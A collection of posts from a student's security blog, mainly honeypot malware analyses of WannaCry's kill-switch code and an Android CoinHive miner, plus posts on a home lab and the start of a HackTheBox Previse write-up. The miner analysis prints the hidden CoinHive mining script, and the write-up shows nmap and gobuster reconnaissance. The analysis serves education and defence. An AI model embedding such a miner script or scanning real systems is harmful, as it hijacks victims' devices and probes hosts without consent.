connections found with netstat while requesting payment information:\nHere are the highlighted addresses with relation to their associated WHOIS registration info:\nAddress Location Owner 168.63.129.16 Hong Kong Aberdeen Microsoft Corp 20.150.30.132 Phoenix, AZ Microsoft Corp 20.60.14.132 Phoenix, AZ Microsoft Corp I had either missed the connection or it had never originated in the first place; alternatively, the malware host was listening for connections using Azure. Further toying with WannaCry revealed that the timer could be modified using the system clock! Setting the time in Windows to several days in the future — thus missing the first payment deadline — raised the file ransom from USD 300 to USD 600.\nSo, then, what happens if the second deadline expires as well? Unfortunately, nothing, so it seems. The timer runs out but then\u0026hellip; Well, the files remain. Not even a pop-up — rather anticlimactic. Further, resetting the system clock refilled the timers and lowered the requested payment back to USD 300.\nSpeaking of payment, the transaction history of the Bitcoin ransom address can be seen here, but to summarize:\n This address has transacted 124 times on the Bitcoin blockchain. It has received a total of 14.87769994 BTC ($522,558.23) and has sent a total of 14.41067602 BTC ($506,154.68). The current value of this address is 0.46702392 BTC ($16,403.56).\n Finally, attempting to send a message via the Contact Us link, which spawned a text entry box, revealed the following, which leads me to believe that finding a valid connection endpoint would have ultimately been useless, as it would have simply been a TOR node.\nOverall, while WannaCry isn\u0026rsquo;t as intimidating as in times past, it was still fun to play around with. If the Bitcoin transaction history is indicative of anything, it\u0026rsquo;s that a very profitable subsection of users still open their computers to see WannaCry\u0026rsquo;s infamous red GUI.\nExamining WannaCry with Ghidra WannaCry has, so far, been only superficially exposed in this post, but Ghidra can be used to dive deeper. Before proceeding, I would like to note that I am not by any means proficient, or even knowledgeable, regarding the process of reverse engineering. I am still a student; it is my hope, however, that others might learn as much as I have by reading further.\nFirst, some information regarding the executable:\n$ file wannacry wannacry: PE32 executable (GUI) Intel 80386, for MS Windows $ strings wannacry ... CryptAcquireContextA CryptGenRandom ... InternetCloseHandle InternetOpenUrlA InternetOpenA .. CryptAcquireContextA CryptGenRandom ... SMBs SMBr SMBs SMB+ ... In particular, consider the following URL.\n$ strings wannacry | grep 'http\\|https' http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com $ curl http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en-us\u0026#34; class=\u0026#34;no-js\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Sinkholed by Kryptos Logic\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Kryptos Logic Sinkhole\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;//static.kryptoslogicsinkhole.com/style.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;flat\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content-box\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;big-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;clear\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h1\u0026gt;Sinkholed!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This domain has been sinkholed by \u0026lt;a href=\u0026#34;https://www.kryptoslogic.com\u0026#34;\u0026gt;Kryptos Logic\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The domain has since been captured, but from a cursory Google search, my understanding is that this was one of the kill-switch sites used to neutralize WannaCry. Here is Ghidra\u0026rsquo;s best attempt to reconstruct the function containing the URL:\nundefined4 FUN_00408140(void) { undefined4 uVar1; int iVar2; undefined4 *puVar3; undefined4 *puVar4; undefined4 uStack100; undefined4 uStack96; undefined4 uStack92; undefined4 local_50 [14]; undefined4 local_17; undefined4 local_13; undefined4 local_f; undefined4 local_b; undefined4 local_7; undefined2 local_3; undefined local_1; puVar3 = (undefined4 *)s_http://www.iuqerfsodp9ifjaposdfj_004313d0;  puVar4 = local_50; for (iVar2 = 0xe; iVar2 != 0; iVar2 = iVar2 + -1) { *puVar4 = *puVar3; puVar3 = puVar3 + 1; puVar4 = puVar4 + 1; } *(undefined *)puVar4 = *(undefined *)puVar3; local_17 = 0; local_13 = 0; local_f = 0; local_b = 0; local_7 = 0; local_3 = 0; uStack92 = 0; uStack96 = 0; uStack100 = 0; local_1 = 0; uVar1 = InternetOpenA(0,1); iVar2 = InternetOpenUrlA(uVar1,\u0026amp;uStack100,0,0,0x84000000,0); if (iVar2 == 0) { InternetCloseHandle(uVar1); InternetCloseHandle(0); FUN_00408090(); return 0; } InternetCloseHandle(uVar1); InternetCloseHandle(iVar2); return 0; } It appears that InternetOpenA(), for example, is a system call to a function in Microsoft\u0026rsquo;s own WININET.DLL, as shown below, which is contained within the wininet.h header.\nff 15 34 a1 40 00 CALL dword ptr [WININET.DLL::InternetOpenA] Microsoft says that InternetOpenA() \u0026ldquo;initializes an application\u0026rsquo;s use of the WinINet functions.\u0026rdquo; WannaCry then uses InternetOpenUrlA(), which, also per Microsoft documentation, \u0026ldquo;opens a resource specified by a complete FTP or HTTP URL.\u0026rdquo;\nConsider, then, the following excerpt from The Conversation\u0026rsquo;s 2017 article about WannaCry, Here’s how the ransomware attack was stopped – and why it could soon start again:\n In the case of WannaCry, a researcher using the pseudonym MalwareTech ended up accidentally activating the kill switch when he tried to create a sinkhole in order to study the software. WannaCry included code that looked to check if a specified domain had been registered. If it received a response from the domain, it shut down. If not, it continued to work. So when MalwareTech registered the domain, it effectively activated the kill switch.\n So, then, Ghidra\u0026rsquo;s disassembly from above could presumably be annotated with comments like so:\n... uVar1 = InternetOpenA(0,1); // Initialize WinInit capability  iVar2 = InternetOpenUrlA(uVar1,\u0026amp;uStack100,0,0,0x84000000,0); // Check for a response from the URL  if (iVar2 == 0) { // If no reponse is received, as domain is unregistered  InternetCloseHandle(uVar1); // Close the socket  InternetCloseHandle(0); // Close the socket  FUN_00408090(); // !! PROCEED WITH WANNACRY !!  return 0; } // Otherwise, just close the socket and quit without executing WannaCry  InternetCloseHandle(uVar1); InternetCloseHandle(iVar2); return 0; } Conclusion By this point, my disassembly-related technical skill had been exhausted. Overall, this has certainly been one of the most interesting parts of my honeypot project thus far. Thank you so much for reading and stay tuned; more posts in my Fishing for Malware series will be published soon.\n Fishing for Malware: Part 4 →\n← Fishing for Malware: Part 2\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/fishing-for-malware-3/","summary":"Analysis of malware dropped into my Google Cloud honeypot — WannaCry","title":"Fishing for Malware — Part Three: WannaCry"},{"content":"Information Indicators of Compromise  MD5: 8844985fcd57b0311d1d4cb2ec13a1ef SHA-1: a0c07fe897515e5575a72f94f9dea8c077a410ff SHA-256: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257 Package name: com.ufo.miner Connected domain: coinhive.com Unexpected high utilization of Android device resources  File  Magic: APK archive Language: Java Size: 45.43 KB  See this file on VirusTotal\nAs the heading and package name imply, this is a crypto miner developed for Android devices. However, that isn\u0026rsquo;t particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let\u0026rsquo;s take a look inside the file.\nSource Extraction $ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip Archive: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip inflating: META-INF/MANIFEST.MF inflating: META-INF/CERT.SF inflating: META-INF/CERT.RSA extracting: res/drawable-xhdpi-v4/ic_launcher.png inflating: AndroidManifest.xml extracting: res/drawable-hdpi-v4/ic_launcher.png inflating: res/layout/activity_main.xml inflating: assets/run.html extracting: resources.arsc extracting: res/drawable-mdpi-v4/ic_launcher.png inflating: classes.dex extracting: res/drawable-xxhdpi-v4/ic_launcher.png inflating: res/menu/main.xml $ I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar with. Let\u0026rsquo;s check them out.\n$ cat assets/run.html \u0026lt;script src=\u0026#34;https://coinhive.com/lib/coinhive.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var miner = new CoinHive.Anonymous(\u0026#39;fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE\u0026#39;,{ threads:4, throttle: 0.8 }); miner.start(); \u0026lt;/script\u0026gt; Sigh. It remains boring. However, by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from Fortinet, indicating that this CoinHive-related malware may have been a part of the Trinity Android P2P malware bot, which is quite interesting. Alas, that is a rabbit hole for another blog post.\nEach PNG was a rescaled version of the stock Android logo — not much to say beyond that.\nHow I assume this malware works:\n  The victim\u0026rsquo;s stock web browser embeds into an app frame in the background.\n  Instructions are received from CoinHive.\n  The miner starts working, sending proof of work to the address hardcoded into the script.\n  The victim\u0026rsquo;s phone gets too hot, or the battery drains too fast; upon seeing the culprit as com.ufo.miner in the power report of the device, the victim promptly uninstalls the application.\n  Personal Thoughts This is a very small application and doesn\u0026rsquo;t perform any particularly special operations; in fact, I debated including it in this series at all. More interesting that the malware itself to me, however, is the platform it targets.\nIn the context of cryptocurrency mining, Android devices are not particularly powerful, and therefore not as lucrative as most other computing machines. It would take a vast, vast array of Android smartphones/tablets/et cetera to generate even a moderate amount of the more popular cryptocurrencies available today, such as Bitcoin. This issue is exacerbated by the ease of detection; many users infected with this malware, I would reason, could trivially identify its existance via the power usage utility on their respective Android device, thereby shortening runtime.\nA humorus reference to Coinhive\u0026rsquo;s coinhive.min.js script I found online: \u0026ldquo;Stack Overflow: [Coinhive header] automatically appears in my website\u0026rdquo;\nAnd, finally, kudos to Troy Hunt, who bought the Coinhive domain and shut it down.\nThanks so much for reading!\n Fishing for Malware: Part 3 →\n← Fishing for Malware: Part 1\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/fishing-for-malware-2/","summary":"Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner","title":"Fishing for Malware — Part Two: Android Crypto Miner"},{"content":"Edited on 2022.02.09\nOver the past week three weeks (school occupied my time), I have left a honeypot (T-Pot, courtesy of Telekom) running, hosted on a VM instance in Google Cloud. After all, what better way to thank Google for the $400 of free Cloud Compute resources they gifted me than to attract malware-distributing bots and hackers directly to their data centers? I jest, but the results of the honeypot thus far have been fascinating and insightful — from attack origins to the payloads and attempted exploits logged, there is much to share.\nFirst, however, I would like to reference the material that inspired and helped me set up the virtual environment for this post. My friend and peer Nathan Burns hosts a technical blog similar to mine at nburns.tech. Further, if you\u0026rsquo;re interested in creating a honeypot of your own as Nathan and I have (which, mind you, is a surprisingly accessible project), I suggest you check out his tutorial, Installing and Configuring a Honeypot in Google Cloud. His two-part article does away with the complexity and ambiguity otherwise associated with this task and explains every step required to replicate our configurations in detail.\nStructure and Purpose Due to the depth of this topic, Fishing for Malware will be published as a series of posts; what you are reading now is only the introduction. In this series, I will examine a subsection of the malicious binaries received and the attack surfaces exploited. My research target is to log one-million attacks; at that point, I will shut down the honeypot and share the aggregate data collected for the duration of uptime.\nI intend to — as a result — shed some light on how malicious actors execute non-targeted, automated attacks against the Internet of Things on a superficial level. Telekom\u0026rsquo;s T-Pot resource collection is well suited to this task, exposing bait services on the most common vectors, such as brute-force SSH, to the uncommon and exotic, like wireless Android ADB.\nPlease note that, as with all content on my website, education is the only objective. By exposing malicious source code and strategies employed by malware authors, I hope only to contribute to the cybersecurity community and my knowledge. Please do not copy any of the techniques shown here for unethical purposes.\nLet\u0026rsquo;s get started.\n Fishing for Malware: Part 2 →\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/fishing-for-malware-1/","summary":"Analysis of malware dropped into my Google Cloud honeypot — preliminary notes","title":"Fishing for Malware — Part One: Introduction"},{"content":"I was recently in the position to buy a new laptop, an essential tool ever since my university transitioned back to in-person courses post-Covid lockdowns. No longer could I rely on being landlocked to my bulky desktop at home; while I already had an older netbook, it was slow and rather uncomfortable for extended use. We are nothing if not spoiled for choice in the laptop market today, however — deciding on what to purchase was not an easy choice for me, especially given that I am a student with limited spending power.\nSo, given the myriad of powerful workstation-class, portable x86 machines for sale, why did I eventually land on an ARM-powered MacBook with comparatively poor software and virtualization support as a cybersecurity student? My intention here is not to sell anyone on my decisions, and what works well for me may not for another user, even one with a similar workflow. However, if another student encounters this post, I\u0026rsquo;d like to share my thoughts and experiences using macOS for the first time after a lifetime of Windows and Linux; to provide the perspective I wish I could have been exposed to before making the jump.\nFor the record, I purchased the 2020 M1 MacBook Air for $976.31 after tax in early October of 2021, which is approximately three months before the publication of this post. I migrated all my work off of my Windows 10 desktop to the laptop shortly after its arrival — that way, I could transport my primary workstation between my house and my university campus.\nMy Workflow In all honesty, doing much of anything on a laptop, especially multitasking, is not comfortable to me — juggling windows and virtual desktops is tedious and, at times, frustrating, not to mention the lack of screen real estate in general. I much prefer the traditional desktop setup. My intention with any laptop as a workstation is to use it in its intended form while traveling but to plug it into a desktop-style configuration when possible.\nI do all my cybersecurity homework in virtual machines and containers, which eases machine state management, provides for manipulatable environments, and abstracts my work from personal use. That includes using security tools: Nmap, Wireshark, Burp Suite, etc.; programming: C, Java, Python, PHP, JavaScript, etc.; mounting databases; executing Windows and Linux binaries, among other tasks. Therefore, I need access to a VMM and spare resources for VMs\u0026hellip; an ill-supported ARM-based, fanless machine with only eight gigabytes of memory and less than 250 gigabytes of usable storage is not quite up to that task.\nFor that reason — and this is an important point — I have several virtual machines hosted on separate servers accessible over my LAN or remotely via an OpenVPN server I set up. I remote into these VMs for work; in that sense, my MacBook is but a thin client. I do not recommend replicating my purchase whatsoever if intending to use a single device as an all-in-one computing solution.\nPain Points Before proceeding, I feel it\u0026rsquo;s important to note that many of my complaints are not slights against the MacBook or macOS; the most significant issues I have with the device are related to my prior experience with desktop computers in general. The most notable behavior includes that which is not bad, per se, just unexpected.\nDefault macOS Shortcuts and Key Layout The standard full-sized US keyboard layout dictates that the bottom left-hand side should consist of the keys control, OS modifier, and then alt, in that order, before space. The MacBook\u0026rsquo;s built-in keyboard switches this up in radical fashion, replacing that order with function, control, alt, OS modifier, and then space. I rely primarily on the keyboard for all input using shortcuts in place of the mouse/touchpad, making the layout differences one of the most frustrating parts of transitioning between macOS and Windows/Linux. It is true that software such as Karabiner Elements may be used to remap keys, but this requires tedious configuration, requires constantly-running software with access to all keyboard input, and doesn\u0026rsquo;t change the physical layout of the buttons, which still differs from the standardized US keyboard.\nThen, the shortcuts themselves are also quite different. For example, in Windows and most desktop Linux distributions I\u0026rsquo;ve used, control + Z and control + Y undo and redo a given action within an application that supports such interaction, respectively. In macOS, control + Z is still bound to undo, but control + shift + Z is the combination to redo, whereas control + Y typically does nothing. Disrupting such a frequently used shortcut with change feels cumbersome and unwelcome — again, however, these are not inherent issues with macOS, but simply troublesome inconsistencies resulting from different patterns of use.\nUser Freedom and Customization Where Windows has PowerShell, and Linux has Bash, macOS has — well, macOS has Bash too (and Zsh by default now, a welcome change). On Windows, I can spawn an elevated PowerShell instance to get what I need, and on Linux, for better or worse, I can sudo myself into an unrecoverable state. Should I simply want to remove the Chess application on macOS, however, it is required to reboot into recovery mode and disable the system integrity protection (SIP) so that I am then allowed to execute sudo to remove Chess.app, which will be immediately reinstalled upon the next update. Sigh.\nInstead, Apple would prefer users only modify the system to the extent advertised within the System Preferences app. While my previous example of removing a built-in game is ultimately insignificant and meaningless in terms of usability, the issue presented there extends into other areas of operation. Ultimately, these issues will not matter to most users, and neither do they significantly affect my workflow. That said, the level of user restriction stands out to me, as I prefer the Linux \u0026ldquo;you are the authority of your own system\u0026rdquo; approach on a philosophical level.\nHardware Issues The single most annoying hardware issue I have with the M1 Air is the back of native multi-monitor support. There are two Thunderbolt 3 ports, each supporting up to 40 gigabits per second data transfer. I have two 2560x1440 displays at 60 Hz, 8-bit color depth, which works out to a total data transfer requirement of a little over 13 gigabits per second to drive both simultaneously. Why Apple decided to limit the M1 SoC from supporting more than one external display out of the box is baffling to me. Instead, I had to pay 150 dollars for a special dock that required a third-party driver to work — but it did work, indicating that the hardware is perfectly capable of supporting more than one external display in extended mode.\nThen, there is a strange compatibility issue between the macOS and my Logitech GPW mouse, which has not been present in any other machine I have used. Specifically, the mouse seems to \u0026ldquo;skip\u0026rdquo; across the screen ever so often. This problem doesn\u0026rsquo;t impact my work but is relatively annoying.\nSaving Graces of the MacBook Lots of negativity so far, so why didn\u0026rsquo;t I return the machine and opt for something else? Despite the aforementioned issues — believe me, they are annoying — the new ARM-based MacBooks are very solid in nearly every other respect. I certainly don\u0026rsquo;t believe the older x86-based models are worth buying, but Apple\u0026rsquo;s new hardware, being under their control to a great degree, has allowed the creation of a tightly integrated, highly optimized experience. I won\u0026rsquo;t preach every benefit in exhaustive detail (plenty of other resources for that), but I believe some things deserve mention here. Whereas the performance cannot come close to my desktop computer and the benefits of the UNIX environment can be easily replicated with Linux, the incredible battery life and fanless (and thus silent) operation have been consistently impressive. Power management is aggressive, and this writing this entire post, for example, has drained my battery from 100% to 97% thus far — just see below, with VS Code, Firefox, Spotify, Zoom, and many other apps open:\n$ sudo powermetrics ... ANE Power: 0 mW DRAM Power: 18 mW CPU Power: 282 mW GPU Power: 3 mW Package Power: 305 mW Conclusion I intend for this post to provide another perspective on using macOS as a user of Windows and Linux, especially as a cybersecurity student. Is the M1 platform a reasonable all-in-one solution for my work? Certainly not. Operating as a thin-client, offloading computationally expensive or incompatible tasks, however, makes the base-model MacBook an exceptional tool. Disregarding raw performance and application compatibility allows issues such as battery life, display quality, etc., to gain pertinence; in those respects, the MacBook excels.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/macos-cybersecurity-student/","summary":"My personal perspective on running MacOS as a Cybersecurity student — not everyone\u0026rsquo;s first choice","title":"Running macOS as a Cybersecurity Student"},{"content":"I recently interviewed virtually for a remote junior sysadmin role at a local company. Ultimately, I was not extended an offer of employment; however, I feel I learned a lot from the interview process, especially considering the rather unconventional nature of the questions I was asked. I\u0026rsquo;ll expand on this point in the future, as much of the discussion to be had there is outside the scope of this post.\nOne topic the company hiring manager and sysadmin team raised with me during the technical interview round was my network and home lab; specifically, if I could describe it in detail and what I might change about it given the opportunity. As I was sharing my screen at the time, what better to show than a plot of my network as I reviewed each component? Alas, what documentation I did have was poor quality and severely outdated — overall, not something of any genuine use.\nI felt I should refresh my network diagram, both in case a similar situation arises and for my benefit. After all, it is perhaps ironic that, as invested as I am in the world of security and networking, I was still logging into my router\u0026rsquo;s web interface to view devices in my DHCP pools each time I forgot the IP address of a machine I needed to connect to\u0026hellip;\nFurther, I have arguably managed to be rather frugal while building my network and home lab. If you\u0026rsquo;re reading this and have an interest in developing your network or home lab up from ground zero, stay with me; I\u0026rsquo;ll show my hardware, machine configurations, and the services I host, and how it\u0026rsquo;s possible to do the same without breaking the bank.\nLogical Topology: A Rough Draft Using Lucid, I created an illustration of the significant devices within my network and how they relate to one another. Of significant note: the majority of client devices and the model of my edge router have been excluded, as the clients on my network have no significance as they relate to the architecture of the network and I have no intention of broadcasting what router I use in case somehow a related CVE is discovered and exploited faster than I can patch it. I recognize that security by obscurity is, of course, not a viable strategy, but my point stands.\nIn any case, what I have shown above highlights the important parts of my hardware. My Internet plan allows for maximum realistic throughout of 540/17 Mbps, and what I have installed provides for that without issue — all Ethernet cabling is a mixture of Cat 5E and Cat 6.\nHardware As it relates to designing a network, the physical topology of my residence is somewhat awkward: the house is not attached to the garage, and in turn, a studio-sized outbuilding branches off from the garage, though is similarly disconnected from the house. As a result, two wireless access points and two separate Ethernet runs from the garage are required to ensure LAN connectivity throughout the property.\nRouting \u0026amp; Switching Since there are not many wired devices, I have managed to get away with only a few physical switches and my edge router for packet routing. All physical switches in question are unmanaged, 5-port gigabit models from TP-Link.\nInterfaces eth1 and eth2 connect to a virtual switch on my router, which pulls IP addresses from a single DHCP pool. eth1 connects to the main house and eth2 to the outbuilding.\nWireless Access Points Serving the main house is a retired Netgear Nighthawk R6700v3 router/switch/AP combo unit. This used to be my main router and AP but now operates exclusively in AP mode. Side note: I resent the R6700v3, and I regret purchasing it. Perhaps it\u0026rsquo;s better with DD-WRT, but I haven\u0026rsquo;t tried for myself; the stock Netgear firmware is terrible, however: very slow, buggy, and vulnerable. I\u0026rsquo;m glad it isn\u0026rsquo;t exposed to the Internet any longer. Do yourself a favor and stay away from this product (and Netgear as a whole, if you value your sanity).\nThe garage and outbuilding, conversely, are wirelessly supported with hardware I like quite a lot: Ubiquiti\u0026rsquo;s Access Point WiFi 6 Lite. I haven\u0026rsquo;t had any issues with Ubiquiti gear so far — admittedly, that means very little outside of an enterprise context.\nServices DHCP My router serves IP addresses over two pools: LAN provides addresses to devices downstream of the aforementioned virtual switch. My server hardware rests in the garage, since it can be somewhat noisy, and gets addresses from garage.\nOpenVPN My router also runs an OpenVPN server using interface vtun0. I was inclined to use WireGuard, but the WireGuard binary wasn\u0026rsquo;t considered stable at the time I set up my VPN interface, so I stayed with OpenVPN.\nI do all of my work on a MacBook, which essentially acts as a thin client to SSH/VNC into my Linux servers and VMs for the heavy-lifting on development and projects; in that respect, OpenVPN connectivity to my local network has been very useful when I\u0026rsquo;m away from home. Further, if I ever need files on local machines, my network is only a click (and a decent Internet connection) away.\nI\u0026rsquo;ll write a post in the future on my experience using macOS for school and projects related to my in-progress cybersecurity and political science degrees, since I know many tend to shy away from Apple products in the security field.\nDNS My DHCP pools are configured to advertise the server on my network running AdGuard Home, a free DNS server centered around, as the name implies, blocking advertisements. While it\u0026rsquo;s easy enough to run uBlock on a desktop browser (or Firefox Mobile) to avoid the great majority of advertisements on the web, the same cannot be said when considering, for instance, Roku on the TV or apps on smartphones. AdGuard is a fantastic DNS server similar to PiHole — host blacklist files can be easily installed, and when a device tries to connect to a domain in those blacklists, AdGuard won\u0026rsquo;t resolve the IP, leading to a dropped connection.\n Why use AdGuard over PiHole?\n No reason — both are fantastic appliances and serve the same purpose. Using the OISD domain list, which works on both AdGuard and PiHole, ads are limited while not breaking any websites I use.\nRunning a local DNS server also has the advantage of being able to examine domain request statistics network-wide, which can lead to some interesting discoveries. My household typically makes between 40,000 and 50,000 DNS requests per any given 24-hour interval, about 40 percent of which are found on my loaded blacklists and subsequently dropped, which I find shocking. Further, it was only once I directed all of my devices towards my DNS server that I discovered the sheer volume of garbage requests sent by Roku and my Netgear router — a single Roku on my network alone sends about 7,000 requests per day to scribe.logs.roku.com and cloudservices.roku.com, collectively. I assume both are related to telemetry.\nVS Code Server Using an M1 MacBook for work, I am locked out of running a great deal of software related to cybersecurity, either because ARM, macOS, or both aren\u0026rsquo;t supported by the tools I need. To bypass this issue, I use VS Code\u0026rsquo;s SSH extension to develop on x86 hardware running Linux. That way, I don\u0026rsquo;t have to consider compatibility issues while writing code. The Markdown source file that contains the text on this page, as well as Node.js to build this website, are all accessed by my laptop remotely in this manner.\nMicrosoft Key Management Service Since I often work with Windows 10 VMs (in an educational context), I use vlmcsd to license new images. Note: I do not condone piracy — a third-party KMS server could be used for that purpose.\nProxmox I use Proxmox VE as a bare-metal VMM, chosen over ESXi for its advanced feature set and as a learning experience. As it stands, my host Proxmox host is less-than-powerful. Linux guests perform acceptably, though Windows 10, given its graphical acceleration requirements, makes for a rough experience. Further, I only have 250 gigabytes of storage space, which severely limits the number of guests I can store.\nNext Steps Reflecting on my current network configuration, my needs are served. However, my Proxmox host is sorely deserving of an upgrade. Looking towards the future, I\u0026rsquo;d like to purchase a few terabytes of solid-state storage and configure ZFS in RAID 1, just in case something goes wrong. Further, I have a spare Nvidia GT 1030 I\u0026rsquo;d like to try to configure for GPU passthrough to improve the desktop performance for Windows guests — whether I can avoid the dreaded error code 43 on Pascal architecture remains to be seen.\nAs a student, I am not flush with money. Assuming that changed, I would like to build a powerful computer and virtualize everything off of it through Proxmox. In that sense, I suppose all-inclusive virtualization is my end goal.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/documenting-my-network/","summary":"Running inventory for interviews","title":"Documenting My Network"},{"content":"Hello, and welcome! You are currently reading my first \u0026ldquo;official\u0026rdquo; post here, having now fleshed out all of the necessary features of my new website, swlacy.com. This space is designed to fulfill my needs as a platform to publish technical content and reflect on my learning as a cybersecurity and political science student.\nThere is not any particular wealth of content as I write this blog submission; most notably, you may find more information about me here or view my first tutorial/walkthrough publication on HackTheBox\u0026rsquo;s Previse challenge here, but that highlights the extent of my uploads so far.\nI have been hard at work tuning this website and maintaining the WWU Cybersecurity Club over the 2021 holiday season; expect more articles and blog posts to appear soon enough.\nKind regards,\nSid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/first-post/","summary":"First Post","title":"First Post"},{"content":"Hello, and thank you for expressing interest in my report on Previse, a CTF hosted by Hack the Box. Previse was uploaded by HTB user m4lwhere 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty.\nPrevise requires the submission of a USER flag and a SYSTEM flag, and I have described the process I used to capture both in-depth below.\nFeedback? I can be reached via email.\nEnumeration Nmap This is a single-machine CTF, for which HTB has already provided the IP address (10.10.11.104), so we can begin with an NMAP scan on the target — taking some inspiration from IppSec, executing nmap -sC -sV -oA previse 10.10.11.104 will hopefully reveal some information of interest.\n$ nmap -sC -sV -oA previse 10.10.11.104 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.104 Host is up (0.083s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds As it appears, Previse is listening on port 22 for incoming SSH connections and on port 80 for HTTP requests with an Apache server. Navigating to http://10.10.11.104 redirects to http://10.10.11.104/login.php; here\u0026rsquo;s a screenshot of that page: Good news — a login portal is likely something we can exploit. I tried a few common credential combinations, such as admin:admin and user:password, but was unable to log in. No matter, however, as the site still may hold useful resources not protected by a credential prompt. To determine whether this is the case, let\u0026rsquo;s use Gobuster.\nGobuster gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php performs a brute force directory search on Previse to reveal any hidden pages with names found in directory-list-2.3-medium.txt and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues — after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:\n$ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2968] [--\u0026gt; login.php] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u0026gt; login.php] Progress: 182532 / 882244 (20.69%) [ERROR] [!] Get \u0026quot;http://10.10.11.104/17878\u0026quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] [!] Get \u0026quot;http://10.10.11.104/chatterbox.txt\u0026quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] [!] Get \u0026quot;http://10.10.11.104/merchantsolutions.php\u0026quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) ^C Unfortunately, the majority of pages found by Gobuster redirect back to login.php page, and the exceptions are not useful in ways I have knowledge of\u0026hellip; For example, viewing a global CSS configuration file was permitted sans-login at /css/uikit.min.css. Clearly, this issue calls for a different strategy.\nMITM Attack — 